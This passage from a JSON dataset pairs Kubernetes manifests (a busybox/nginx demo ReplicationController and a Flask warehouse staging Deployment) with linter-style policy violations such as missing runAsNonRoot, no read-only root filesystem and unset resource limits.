    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  namespace: demos\n  name: update-demo-rc-v2\nspec:\n  replicas: 5\n  selector:\n    demo: update\n    demo-version: v2\n  template:\n    metadata:\n      labels:\n        demo: update\n        demo-version: v2\n    spec:\n      containers:\n      - name: busybox\n        image: busybox\n        command:\n        - sh\n        - -c\n        - while true; do echo \"$(hostname) v2\" > /data/index.html; sleep 60; done\n        volumeMounts:\n        - name: content\n          mountPath: /data\n      - name: nginx\n        image: nginx\n        volumeMounts:\n        - name: content\n          mountPath: /usr/share/nginx/html\n          readOnly: true\n      volumes:\n      - name: content\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 5 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "10891",
    "manifest_path": "data/manifests/the_stack_sample/sample_4188.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  namespace: demos\n  name: update-demo-rc-v2\nspec:\n  replicas: 5\n  selector:\n    demo: update\n    demo-version: v2\n  template:\n    metadata:\n      labels:\n        demo: update\n        demo-version: v2\n    spec:\n      containers:\n      - name: busybox\n        image: busybox\n        command:\n        - sh\n        - -c\n        - while true; do echo \"$(hostname) v2\" > /data/index.html; sleep 60; done\n        volumeMounts:\n        - name: content\n          mountPath: /data\n      - name: nginx\n        image: nginx\n        volumeMounts:\n        - name: content\n          mountPath: /usr/share/nginx/html\n          readOnly: true\n      volumes:\n      - name: content\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"busybox\" does not have a read-only root file system"
  },
  {
    "id": "10892",
    "manifest_path": "data/manifests/the_stack_sample/sample_4188.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  namespace: demos\n  name: update-demo-rc-v2\nspec:\n  replicas: 5\n  selector:\n    demo: update\n    demo-version: v2\n  template:\n    metadata:\n      labels:\n        demo: update\n        demo-version: v2\n    spec:\n      containers:\n      - name: busybox\n        image: busybox\n        command:\n        - sh\n        - -c\n        - while true; do echo \"$(hostname) v2\" > /data/index.html; sleep 60; done\n        volumeMounts:\n        - name: content\n          mountPath: /data\n      - name: nginx\n        image: nginx\n        volumeMounts:\n        - name: content\n          mountPath: /usr/share/nginx/html\n          readOnly: true\n      volumes:\n      - name: content\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "10893",
    "manifest_path": "data/manifests/the_stack_sample/sample_4188.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  namespace: demos\n  name: update-demo-rc-v2\nspec:\n  replicas: 5\n  selector:\n    demo: update\n    demo-version: v2\n  template:\n    metadata:\n      labels:\n        demo: update\n        demo-version: v2\n    spec:\n      containers:\n      - name: busybox\n        image: busybox\n        command:\n        - sh\n        - -c\n        - while true; do echo \"$(hostname) v2\" > /data/index.html; sleep 60; done\n        volumeMounts:\n        - name: content\n          mountPath: /data\n      - name: nginx\n        image: nginx\n        volumeMounts:\n        - name: content\n          mountPath: /usr/share/nginx/html\n          readOnly: true\n      volumes:\n      - name: content\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"busybox\" is not set to runAsNonRoot"
  },
  {
    "id": "10894",
    "manifest_path": "data/manifests/the_stack_sample/sample_4188.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  namespace: demos\n  name: update-demo-rc-v2\nspec:\n  replicas: 5\n  selector:\n    demo: update\n    demo-version: v2\n  template:\n    metadata:\n      labels:\n        demo: update\n        demo-version: v2\n    spec:\n      containers:\n      - name: busybox\n        image: busybox\n        command:\n        - sh\n        - -c\n        - while true; do echo \"$(hostname) v2\" > /data/index.html; sleep 60; done\n        volumeMounts:\n        - name: content\n          mountPath: /data\n      - name: nginx\n        image: nginx\n        volumeMounts:\n        - name: content\n          mountPath: /usr/share/nginx/html\n          readOnly: true\n      volumes:\n      - name: content\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "10895",
    "manifest_path": "data/manifests/the_stack_sample/sample_4188.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  namespace: demos\n  name: update-demo-rc-v2\nspec:\n  replicas: 5\n  selector:\n    demo: update\n    demo-version: v2\n  template:\n    metadata:\n      labels:\n        demo: update\n        demo-version: v2\n    spec:\n      containers:\n      - name: busybox\n        image: busybox\n        command:\n        - sh\n        - -c\n        - while true; do echo \"$(hostname) v2\" > /data/index.html; sleep 60; done\n        volumeMounts:\n        - name: content\n          mountPath: /data\n      - name: nginx\n        image: nginx\n        volumeMounts:\n        - name: content\n          mountPath: /usr/share/nginx/html\n          readOnly: true\n      volumes:\n      - name: content\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"busybox\" has cpu request 0"
  },
  {
    "id": "10896",
    "manifest_path": "data/manifests/the_stack_sample/sample_4188.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  namespace: demos\n  name: update-demo-rc-v2\nspec:\n  replicas: 5\n  selector:\n    demo: update\n    demo-version: v2\n  template:\n    metadata:\n      labels:\n        demo: update\n        demo-version: v2\n    spec:\n      containers:\n      - name: busybox\n        image: busybox\n        command:\n        - sh\n        - -c\n        - while true; do echo \"$(hostname) v2\" > /data/index.html; sleep 60; done\n        volumeMounts:\n        - name: content\n          mountPath: /data\n      - name: nginx\n        image: nginx\n        volumeMounts:\n        - name: content\n          mountPath: /usr/share/nginx/html\n          readOnly: true\n      volumes:\n      - name: content\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "10897",
    "manifest_path": "data/manifests/the_stack_sample/sample_4188.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  namespace: demos\n  name: update-demo-rc-v2\nspec:\n  replicas: 5\n  selector:\n    demo: update\n    demo-version: v2\n  template:\n    metadata:\n      labels:\n        demo: update\n        demo-version: v2\n    spec:\n      containers:\n      - name: busybox\n        image: busybox\n        command:\n        - sh\n        - -c\n        - while true; do echo \"$(hostname) v2\" > /data/index.html; sleep 60; done\n        volumeMounts:\n        - name: content\n          mountPath: /data\n      - name: nginx\n        image: nginx\n        volumeMounts:\n        - name: content\n          mountPath: /usr/share/nginx/html\n          readOnly: true\n      volumes:\n      - name: content\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"busybox\" has memory limit 0"
  },
  {
    "id": "10898",
    "manifest_path": "data/manifests/the_stack_sample/sample_4188.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  namespace: demos\n  name: update-demo-rc-v2\nspec:\n  replicas: 5\n  selector:\n    demo: update\n    demo-version: v2\n  template:\n    metadata:\n      labels:\n        demo: update\n        demo-version: v2\n    spec:\n      containers:\n      - name: busybox\n        image: busybox\n        command:\n        - sh\n        - -c\n        - while true; do echo \"$(hostname) v2\" > /data/index.html; sleep 60; done\n        volumeMounts:\n        - name: content\n          mountPath: /data\n      - name: nginx\n        image: nginx\n        volumeMounts:\n        - name: content\n          mountPath: /usr/share/nginx/html\n          readOnly: true\n      volumes:\n      - name: content\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "10899",
    "manifest_path": "data/manifests/the_stack_sample/sample_4189.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: warehouse-staging\nspec:\n  selector:\n    matchLabels:\n      app: warehouse\n      env: staging\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: warehouse\n        env: staging\n    spec:\n      initContainers:\n      - name: migrate\n        image: gcr.io/dd-decaf-cfbf6/warehouse:devel\n        imagePullPolicy: Always\n        env:\n        - name: ENVIRONMENT\n          value: staging\n        - name: SCRIPT_NAME\n          value: /warehouse\n        - name: FLASK_APP\n          value: src/warehouse/wsgi.py\n        - name: ALLOWED_ORIGINS\n          value: https://caffeine.dd-decaf.eu,https://staging.dd-decaf.eu,http://localhost:4200\n        - name: IAM_API\n          value: http://iam-staging/iam\n        - name: POSTGRES_HOST\n          value: cloudsql-proxy\n        - name: POSTGRES_PORT\n          value: '5432'\n        - name: POSTGRES_DB_NAME\n          value: warehouse_staging\n        - name: SECRET_KEY\n          valueFrom:\n            secretKeyRef:\n              name: warehouse-staging\n              key: SECRET_KEY\n        - name: POSTGRES_ENV_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: warehouse-staging\n              key: POSTGRES_ENV_USERNAME\n        - name: POSTGRES_ENV_PASS\n          valueFrom:\n            secretKeyRef:\n              name: warehouse-staging\n              key: POSTGRES_ENV_PASS\n        - name: SENTRY_DSN\n          valueFrom:\n            secretKeyRef:\n              name: warehouse-staging\n              key: SENTRY_DSN\n        - name: BASIC_AUTH_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: warehouse-staging\n              key: BASIC_AUTH_USERNAME\n        - name: BASIC_AUTH_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: warehouse-staging\n              key: BASIC_AUTH_PASSWORD\n        command:\n        - flask\n        - db\n        - upgrade\n        resources:\n          requests:\n            cpu: 1m\n          limits:\n            cpu: 2000m\n      containers:\n      - name: web\n        image: gcr.io/dd-decaf-cfbf6/warehouse:devel\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8000\n        env:\n        - name: ENVIRONMENT\n          value: staging\n        - name: SCRIPT_NAME\n          value: /warehouse\n        - name: FLASK_APP\n          value: src/warehouse/wsgi.py\n        - name: ALLOWED_ORIGINS\n          value: https://caffeine.dd-decaf.eu,https://staging.dd-decaf.eu,http://localhost:4200\n        - name: IAM_API\n          value: http://iam-staging/iam\n        - name: POSTGRES_HOST\n          value: cloudsql-proxy\n        - name: POSTGRES_PORT\n          value: '5432'\n        - name: POSTGRES_DB_NAME\n          value: warehouse_staging\n        - name: SECRET_KEY\n          valueFrom:\n            secretKeyRef:\n              name: warehouse-staging\n              key: SECRET_KEY\n        - name: POSTGRES_ENV_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: warehouse-staging\n              key: POSTGRES_ENV_USERNAME\n        - name: POSTGRES_ENV_PASS\n          valueFrom:\n            secretKeyRef:\n              name: warehouse-staging\n              key: POSTGRES_ENV_PASS\n        - name: SENTRY_DSN\n          valueFrom:\n            secretKeyRef:\n              name: warehouse-staging\n              key: SENTRY_DSN\n        - name: BASIC_AUTH_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: warehouse-staging\n              key: BASIC_AUTH_USERNAME\n        - name: BASIC_AUTH_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: warehouse-staging\n              key: BASIC_AUTH_PASSWORD\n        resources:\n          requests:\n            cpu: 1m\n          limits:\n            cpu: 2000m\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"migrate\" does not have a read-only root file system"
  },
  {
    "id": "10900",
    "manifest_path": "data/manifests/the_stack_sample/sample_4189.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: warehouse-staging\nspec:\n  selector:\n    matchLabels:\n      app: warehouse\n      env: staging\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: warehouse\n        env: staging\n    spec:\n      initContainers:\n      - name: migrate\n        image: gcr.io/dd-decaf-cfbf6/warehouse:devel\n        imagePullPolicy: Always\n        env:\n        - name: ENVIRONMENT\n          value: staging\n        - name: SCRIPT_NAME\n          value: /warehouse\n        - name: FLASK_APP\n          value: src/warehouse/wsgi.py\n        - name: ALLOWED_ORIGINS\n          value: https://caffeine.dd-decaf.eu,https://staging.dd-decaf.eu,http://localhost:4200\n        - name: IAM_API\n          value: http://iam-staging/iam\n        - name: POSTGRES_HOST\n          value: cloudsql-proxy\n        - name: POSTGRES_PORT\n          value: '5432'\n        - name: POSTGRES_DB_NAME\n          value: warehouse_staging\n        - name: SECRET_KEY\n          valueFrom:\n            secretKeyRef:\n              name: warehouse-staging\n              key: SECRET_KEY\n        - name: POSTGRES_ENV_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: warehouse-staging\n              key: POSTGRES_ENV_USERNAME\n        - name: POSTGRES_ENV_PASS\n          valueFrom:\n            secretKeyRef:\n              name: warehouse-staging\n              key: POSTGRES_ENV_PASS\n        - name: SENTRY_DSN\n          valueFrom:\n            secretKeyRef:\n              name: warehouse-staging\n              key: SENTRY_DSN\n        - name: BASIC_AUTH_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: warehouse-staging\n              key: BASIC_AUTH_USERNAME\n        - name: BASIC_AUTH_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: warehouse-staging\n              key: BASIC_AUTH_PASSWORD\n        command:\n        - flask\n        - db\n        - upgrade\n        resources:\n          requests:\n            cpu: 1m\n          limits:\n            cpu: 2000m\n      containers:\n      - name: web\n        image: gcr.io/dd-decaf-cfbf6/warehouse:devel\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8000\n        env:\n        - name: ENVIRONMENT\n          value: staging\n        - name: SCRIPT_NAME\n          value: /warehouse\n        - name: FLASK_APP\n          value: src/warehouse/wsgi.py\n        - name: ALLOWED_ORIGINS\n          value: https://caffeine.dd-decaf.eu,https://staging.dd-decaf.eu,http://localhost:4200\n        - name: IAM_API\n          value: http://iam-staging/iam\n        - name: POSTGRES_HOST\n          value: cloudsql-proxy\n        - name: POSTGRES_PORT\n          value: '5432'\n        - name: POSTGRES_DB_NAME\n          value: warehouse_staging\n        - name: SECRET_KEY\n          valueFrom:\n            secretKeyRef:\n              name: warehouse-staging\n              key: SECRET_KEY\n        - name: POSTGRES_ENV_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: warehouse-staging\n              key: POSTGRES_ENV_USERNAME\n        - name: POSTGRES_ENV_PASS\n          valueFrom:\n            secretKeyRef:\n              name: warehouse-staging\n              key: POSTGRES_ENV_PASS\n        - name: SENTRY_DSN\n          valueFrom:\n            secretKeyRef:\n              name: warehouse-staging\n              key: SENTRY_DSN\n        - name: BASIC_AUTH_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: warehouse-staging\n              key: BASIC_AUTH_USERNAME\n        - name: BASIC_AUTH_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: warehouse-staging\n              key: BASIC_AUTH_PASSWORD\n        resources:\n          requests:\n            cpu: 1m\n          limits:\n            cpu: 2000m\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"web\" does not have a read-only root file system"
  },
  {
    "id": "10901",
    "manifest_path": "data/manifests/the_stack_sample/sample_4189.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: warehouse-staging\nspec:\n  selector:\n    matchLabels:\n      app: warehouse\n      env: staging\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: warehouse\n        env: staging\n    spec:\n      initContainers:\n      - name: migrate\n        image: gcr.io/dd-decaf-cfbf6/warehouse:devel\n        imagePullPolicy: Always\n        env:\n        - name: ENVIRONMENT\n          value: staging\n        - name: SCRIPT_NAME\n          value: /warehouse\n        - name: FLASK_APP\n          value: src/warehouse/wsgi.py\n        - name: ALLOWED_ORIGINS\n          value: https://caffeine.dd-decaf.eu,https://staging.dd-decaf.eu,http://localhost:4200\n        - name: IAM_API\n          value: http://iam-staging/iam\n        - name: POSTGRES_HOST\n          value: cloudsql-proxy\n        - name: POSTGRES_PORT\n          value: '5432'\n        - name: POSTGRES_DB_NAME\n          value: warehouse_staging\n        - name: SECRET_KEY\n          valueFrom:\n            secretKeyRef:\n              name: warehouse-staging\n              key: SECRET_KEY\n        - name: POSTGRES_ENV_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: warehouse-staging\n              key: POSTGRES_ENV_USERNAME\n        - name: POSTGRES_ENV_PASS\n          valueFrom:\n            secretKeyRef:\n              name: warehouse-staging\n              key: POSTGRES_ENV_PASS\n        - name: SENTRY_DSN\n          valueFrom:\n            secretKeyRef:\n              name: warehouse-staging\n              key: SENTRY_DSN\n        - name: BASIC_AUTH_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: warehouse-staging\n              key: BASIC_AUTH_USERNAME\n        - name: BASIC_AUTH_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: warehouse-staging\n              key: BASIC_AUTH_PASSWORD\n        command:\n        - flask\n        - db\n        - upgrade\n        resources:\n          requests:\n            cpu: 1m\n          limits:\n            cpu: 2000m\n      containers:\n      - name: web\n        image: gcr.io/dd-decaf-cfbf6/warehouse:devel\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8000\n        env:\n        - name: ENVIRONMENT\n          value: staging\n        - name: SCRIPT_NAME\n          value: /warehouse\n        - name: FLASK_APP\n          value: src/warehouse/wsgi.py\n        - name: ALLOWED_ORIGINS\n          value: https://caffeine.dd-decaf.eu,https://staging.dd-decaf.eu,http://localhost:4200\n        - name: IAM_API\n          value: http://iam-staging/iam\n        - name: POSTGRES_HOST\n          value: cloudsql-proxy\n        - name: POSTGRES_PORT\n          value: '5432'\n        - name: POSTGRES_DB_NAME\n          value: warehouse_staging\n        - name: SECRET_KEY\n          valueFrom:\n            secretKeyRef:\n              name: warehouse-staging\n              key: SECRET_KEY\n        - name: POSTGRES_ENV_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: warehouse-staging\n              key: POSTGRES_ENV_USERNAME\n        - name: POSTGRES_ENV_PASS\n          valueFrom:\n            secretKeyRef:\n              name: warehouse-staging\n              key: POSTGRES_ENV_PASS\n        - name: SENTRY_DSN\n          valueFrom:\n            secretKeyRef:\n              name: warehouse-staging\n              key: SENTRY_DSN\n        - name: BASIC_AUTH_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: warehouse-staging\n              key: BASIC_AUTH_USERNAME\n        - name: BASIC_AUTH_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: warehouse-staging\n              key: BASIC_AUTH_PASSWORD\n        resources:\n          requests:\n            cpu: 1m\n          limits:\n            cpu: 2000m\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"migrate\" is not set to runAsNonRoot"
  },
  {
    "id": "10902",
    "manifest_path": "data/manifests/the_stack_sample/sample_4189.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: warehouse-staging\nspec:\n  selector:\n    matchLabels:\n      app: warehouse\n      env: staging\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: warehouse\n        env: staging\n    spec:\n      initContainers:\n      - name: migrate\n        image: gcr.io/dd-decaf-cfbf6/warehouse:devel\n        imagePullPolicy: Always\n        env:\n        - name: ENVIRONMENT\n          value: staging\n        - name: SCRIPT_NAME\n          value: /warehouse\n        - name: FLASK_APP\n          value: src/warehouse/wsgi.py\n        - name: ALLOWED_ORIGINS\n          value: https://caffeine.dd-decaf.eu,https://staging.dd-decaf.eu,http://localhost:4200\n        - name: IAM_API\n          value: http://iam-staging/iam\n        - name: POSTGRES_HOST\n          value: cloudsql-proxy\n        - name: POSTGRES_PORT\n          value: '5432'\n        - name: POSTGRES_DB_NAME\n          value: warehouse_staging\n        - name: SECRET_KEY\n          valueFrom:\n            secretKeyRef:\n              name: warehouse-staging\n              key: SECRET_KEY\n        - name: POSTGRES_ENV_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: warehouse-staging\n              key: POSTGRES_ENV_USERNAME\n        - name: POSTGRES_ENV_PASS\n          valueFrom:\n            secretKeyRef:\n              name: warehouse-staging\n              key: POSTGRES_ENV_PASS\n        - name: SENTRY_DSN\n          valueFrom:\n            secretKeyRef:\n              name: warehouse-staging\n              key: SENTRY_DSN\n        - name: BASIC_AUTH_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: warehouse-staging\n              key: BASIC_AUTH_USERNAME\n        - name: BASIC_AUTH_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: warehouse-staging\n              key: BASIC_AUTH_PASSWORD\n        command:\n        - flask\n        - db\n        - upgrade\n        resources:\n          requests:\n            cpu: 1m\n          limits:\n            cpu: 2000m\n      containers:\n      - name: web\n        image: gcr.io/dd-decaf-cfbf6/warehouse:devel\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8000\n        env:\n        - name: ENVIRONMENT\n          value: staging\n        - name: SCRIPT_NAME\n          value: /warehouse\n        - name: FLASK_APP\n          value: src/warehouse/wsgi.py\n        - name: ALLOWED_ORIGINS\n          value: https://caffeine.dd-decaf.eu,https://staging.dd-decaf.eu,http://localhost:4200\n        - name: IAM_API\n          value: http://iam-staging/iam\n        - name: POSTGRES_HOST\n          value: cloudsql-proxy\n        - name: POSTGRES_PORT\n          value: '5432'\n        - name: POSTGRES_DB_NAME\n          value: warehouse_staging\n        - name: SECRET_KEY\n          valueFrom:\n            secretKeyRef:\n              name: warehouse-staging\n              key: SECRET_KEY\n        - name: POSTGRES_ENV_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: warehouse-staging\n              key: POSTGRES_ENV_USERNAME\n        - name: POSTGRES_ENV_PASS\n          valueFrom:\n            secretKeyRef:\n              name: warehouse-staging\n              key: POSTGRES_ENV_PASS\n        - name: SENTRY_DSN\n          valueFrom:\n            secretKeyRef:\n              name: warehouse-staging\n              key: SENTRY_DSN\n        - name: BASIC_AUTH_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: warehouse-staging\n              key: BASIC_AUTH_USERNAME\n        - name: BASIC_AUTH_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: warehouse-staging\n              key: BASIC_AUTH_PASSWORD\n        resources:\n          requests:\n            cpu: 1m\n          limits:\n            cpu: 2000m\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"web\" is not set to runAsNonRoot"
  },
  {
    "id": "10903",
    "manifest_path": "data/manifests/the_stack_sample/sample_4189.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: warehouse-staging\nspec:\n  selector:\n    matchLabels:\n      app: warehouse\n      env: staging\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: warehouse\n        env: staging\n    spec:\n      initContainers:\n      - name: migrate\n        image: gcr.io/dd-decaf-cfbf6/warehouse:devel\n        imagePullPolicy: Always\n        env:\n        - name: ENVIRONMENT\n          value: staging\n        - name: SCRIPT_NAME\n          value: /warehouse\n        - name: FLASK_APP\n          value: src/warehouse/wsgi.py\n        - name: ALLOWED_ORIGINS\n          value: https://caffeine.dd-decaf.eu,https://staging.dd-decaf.eu,http://localhost:4200\n        - name: IAM_API\n          value: http://iam-staging/iam\n        - name: POSTGRES_HOST\n          value: cloudsql-proxy\n        - name: POSTGRES_PORT\n          value: '5432'\n        - name: POSTGRES_DB_NAME\n          value: warehouse_staging\n        - name: SECRET_KEY\n          valueFrom:\n            secretKeyRef:\n              name: warehouse-staging\n              key: SECRET_KEY\n        - name: POSTGRES_ENV_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: warehouse-staging\n              key: POSTGRES_ENV_USERNAME\n        - name: POSTGRES_ENV_PASS\n          valueFrom:\n            secretKeyRef:\n              name: warehouse-staging\n              key: POSTGRES_ENV_PASS\n        - name: SENTRY_DSN\n          valueFrom:\n            secretKeyRef:\n              name: warehouse-staging\n              key: SENTRY_DSN\n        - name: BASIC_AUTH_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: warehouse-staging\n              key: BASIC_AUTH_USERNAME\n        - name: BASIC_AUTH_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: warehouse-staging\n              key: BASIC_AUTH_PASSWORD\n        command:\n        - flask\n        - db\n        - upgrade\n        resources:\n          requests:\n            cpu: 1m\n          limits:\n            cpu: 2000m\n      containers:\n      - name: web\n        image: gcr.io/dd-decaf-cfbf6/warehouse:devel\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8000\n        env:\n        - name: ENVIRONMENT\n          value: staging\n        - name: SCRIPT_NAME\n          value: /warehouse\n        - name: FLASK_APP\n          value: src/warehouse/wsgi.py\n        - name: ALLOWED_ORIGINS\n          value: https://caffeine.dd-decaf.eu,https://staging.dd-decaf.eu,http://localhost:4200\n        - name: IAM_API\n          value: http://iam-staging/iam\n        - name: POSTGRES_HOST\n          value: cloudsql-proxy\n        - name: POSTGRES_PORT\n          value: '5432'\n        - name: POSTGRES_DB_NAME\n          value: warehouse_staging\n        - name: SECRET_KEY\n          valueFrom:\n            secretKeyRef:\n              name: warehouse-staging\n              key: SECRET_KEY\n        - name: POSTGRES_ENV_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: warehouse-staging\n              key: POSTGRES_ENV_USERNAME\n        - name: POSTGRES_ENV_PASS\n          valueFrom:\n            secretKeyRef:\n              name: warehouse-staging\n              key: POSTGRES_ENV_PASS\n        - name: SENTRY_DSN\n          valueFrom:\n            secretKeyRef:\n              name: warehouse-staging\n              key: SENTRY_DSN\n        - name: BASIC_AUTH_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: warehouse-staging\n              key: BASIC_AUTH_USERNAME\n        - name: BASIC_AUTH_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: warehouse-staging\n              key: BASIC_AUTH_PASSWORD\n        resources:\n          requests:\n            cpu: 1m\n          limits:\n            cpu: 2000m\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"migrate\" has memory limit 0"
  },
  {
    "id": "10904",
    "manifest_path": "data/manifests/the_stack_sample/sample_4189.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: warehouse-staging\nspec:\n  selector:\n    matchLabels:\n      app: warehouse\n      env: staging\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: warehouse\n        env: staging\n    spec:\n      initContainers:\n      - name: migrate\n        image: gcr.io/dd-decaf-cfbf6/warehouse:devel\n        imagePullPolicy: Always\n        env:\n        - name: ENVIRONMENT\n          value: staging\n        - name: SCRIPT_NAME\n          value: /warehouse\n        - name: FLASK_APP\n          value: src/warehouse/wsgi.py\n        - name: ALLOWED_ORIGINS\n          value: https://caffeine.dd-decaf.eu,https://staging.dd-decaf.eu,http://localhost:4200\n        - name: IAM_API\n          value: http://iam-staging/iam\n        - name: POSTGRES_HOST\n          value: cloudsql-proxy\n        - name: POSTGRES_PORT\n          value: '5432'\n        - name: POSTGRES_DB_NAME\n          value: warehouse_staging\n        - name: SECRET_KEY\n          valueFrom:\n            secretKeyRef:\n              name: warehouse-staging\n              key: SECRET_KEY\n        - name: POSTGRES_ENV_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: warehouse-staging\n              key: POSTGRES_ENV_USERNAME\n        - name: POSTGRES_ENV_PASS\n          valueFrom:\n            secretKeyRef:\n              name: warehouse-staging\n              key: POSTGRES_ENV_PASS\n        - name: SENTRY_DSN\n          valueFrom:\n            secretKeyRef:\n              name: warehouse-staging\n              key: SENTRY_DSN\n        - name: BASIC_AUTH_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: warehouse-staging\n              key: BASIC_AUTH_USERNAME\n        - name: BASIC_AUTH_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: warehouse-staging\n              key: BASIC_AUTH_PASSWORD\n        command:\n        - flask\n        - db\n        - upgrade\n        resources:\n          requests:\n            cpu: 1m\n          limits:\n            cpu: 2000m\n      containers:\n      - name: web\n        image: gcr.io/dd-decaf-cfbf6/warehouse:devel\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8000\n        env:\n        - name: ENVIRONMENT\n          value: staging\n        - name: SCRIPT_NAME\n          value: /warehouse\n        - name: FLASK_APP\n          value: src/warehouse/wsgi.py\n        - name: ALLOWED_ORIGINS\n          value: https://caffeine.dd-decaf.eu,https://staging.dd-decaf.eu,http://localhost:4200\n        - name: IAM_API\n          value: http://iam-staging/iam\n        - name: POSTGRES_HOST\n          value: cloudsql-proxy\n        - name: POSTGRES_PORT\n          value: '5432'\n        - name: POSTGRES_DB_NAME\n          value: warehouse_staging\n        - name: SECRET_KEY\n          valueFrom:\n            secretKeyRef:\n              name: warehouse-staging\n              key: SECRET_KEY\n        - name: POSTGRES_ENV_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: warehouse-staging\n              key: POSTGRES_ENV_USERNAME\n        - name: POSTGRES_ENV_PASS\n          valueFrom:\n            secretKeyRef:\n              name: warehouse-staging\n              key: POSTGRES_ENV_PASS\n        - name: SENTRY_DSN\n          valueFrom:\n            secretKeyRef:\n              name: warehouse-staging\n              key: SENTRY_DSN\n        - name: BASIC_AUTH_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: warehouse-staging\n              key: BASIC_AUTH_USERNAME\n        - name: BASIC_AUTH_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: warehouse-staging\n              key: BASIC_AUTH_PASSWORD\n        resources:\n          requests:\n            cpu: 1m\n          limits:\n            cpu: 2000m\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"web\" has memory limit 0"
  },
  {
    "id": "10905",
    "manifest_path": "data/manifests/the_stack_sample/sample_4190.yaml",
